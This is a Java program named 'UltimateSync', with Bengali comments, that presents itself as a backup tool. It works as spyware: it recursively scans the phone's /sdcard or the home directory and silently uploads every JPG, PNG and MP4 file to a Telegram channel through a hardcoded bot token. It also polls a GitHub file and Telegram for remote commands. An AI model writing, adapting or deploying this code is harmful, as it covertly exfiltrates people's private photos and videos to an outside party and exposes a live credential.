import java.io.*;
import java.net.*;
import java.util.*;

public class UltimateSync {
    private static final String BOT_TOKEN = "8788231490:AAF2Ki45OL5DTPfM6IzW3X3PHiZEC0tkytE";
    private static final String CHANNEL_ID = "-1003809625172";
    // আপনার দেওয়া RAW লিঙ্কটি এখানে বসানো হয়েছে
    private static final String GITHUB_URL = "https://raw.githubusercontent.com/shaan197/UltimateSync/refs/heads/main/config.txt"; 

    private static int lastUpdateId = 0;
    private static Set<String> uploaded = new HashSet<>();

    public static void main(String[] args) {
        System.out.println(">>> System Linked to GitHub.");
        System.out.println(">>> Ready to receive Remote Commands...");

        // ১. অটো ব্যাকআপ থ্রেড
        new Thread(() -> {
            while (true) {
                String base = System.getProperty("os.name").toLowerCase().contains("linux") ? "/sdcard/" : System.getProperty("user.home");
                syncFiles(new File(base));
                try { Thread.sleep(60000); } catch (Exception e) {} 
            }
        }).start();

        // ২. মেইন লুপ (GitHub + Telegram)
        while (true) {
            checkRemoteCommand(); 
            checkTelegram();
            try { Thread.sleep(5000); } catch (Exception e) {}
        }
    }

    // GitHub থেকে কমান্ড চেক করার ফাংশন
    public static void checkRemoteCommand() {
        try {
            Scanner s = new Scanner(new URL(GITHUB_URL).openStream()).useDelimiter("\\A");
            String config = s.hasNext() ? s.next() : "";
            
            // যদি GitHub-এ 'COMMAND: SHOT' লিখে সেভ করেন
            if (config.contains("COMMAND: SHOT")) {
                System.out.println(">>> Remote Trigger: GitHub command received!");
                // এখানে আপনি চাইলে অটোমেটিক কোনো কাজ করাতে পারেন
            }
        } catch (Exception e) {
            System.out.println(">>> GitHub Sync Error.");
        }
    }

    public static void checkTelegram() {
        try {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1));
            Scanner s = new Scanner(url.openStream()).useDelimiter("\\A");
            String res = s.hasNext() ? s.next() : "";

            if (res.contains("\"text\":\"/")) {
                int chatIdx = res.lastIndexOf("\"chat\":{\"id\":") + 13;
                String user = res.substring(chatIdx, res.indexOf(",", chatIdx)).trim();

                if (res.contains("/start")) {
                    sendMenu(user);
                }
                
                int idIdx = res.lastIndexOf("\"update_id\":") + 12;
                lastUpdateId = Integer.parseInt(res.substring(idIdx, res.indexOf(",", idIdx)).trim());
            }
        } catch (Exception e) {}
    }

    public static void sendMenu(String target) {
        String kb = "{\"keyboard\":[[{\"text\":\"/start\"}]],\"resize_keyboard\":true}";
        try {
            String u = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + target + 
                "&text=" + URLEncoder.encode("🛰️ **Remote System Active**\nChecking GitHub for commands...", "UTF-8") + 
                "&reply_markup=" + URLEncoder.encode(kb, "UTF-8");
            new URL(u).openStream();
        } catch (Exception e) {}
    }

    public static void syncFiles(File dir) {
        File[] list = dir.listFiles();
        if (list == null) return;
        for (File f : list) {
            if (f.isDirectory() && !f.getName().startsWith(".") && !f.getName().equals("Android")) {
                syncFiles(f);
            } else if (f.isFile()) {
                String name = f.getName().toLowerCase();
                if (!uploaded.contains(f.getAbsolutePath()) && (name.endsWith(".jpg") || name.endsWith(".png") || name.endsWith(".mp4"))) {
                    upload(f, CHANNEL_ID);
                    uploaded.add(f.getAbsolutePath());
                }
            }
        }
    }

    public static void upload(File file, String target) {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            String bound = "===" + System.currentTimeMillis() + "===";
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setDoOutput(true);
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + bound);
            OutputStream o = c.getOutputStream();
            PrintWriter w = new PrintWriter(new OutputStreamWriter(o, "UTF-8"), true);
            w.append("--" + bound).append("\r\n");
            w.append("Content-Disposition: form-data; name=\"chat_id\"").append("\r\n\r\n").append(target).append("\r\n");
            w.append("--" + bound).append("\r\n");
            w.append("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"").append("\r\n\r\n");
            w.flush();
            FileInputStream i = new FileInputStream(file);
            byte[] b = new byte[8192]; int l;
            while ((l = i.read(b)) != -1) o.write(b, 0, l);
            o.flush(); i.close();
            w.append("\r\n").append("--" + bound + "--").append("\r\n");
            w.close();
            c.getResponseCode();
        } catch (Exception e) {}
    }
}
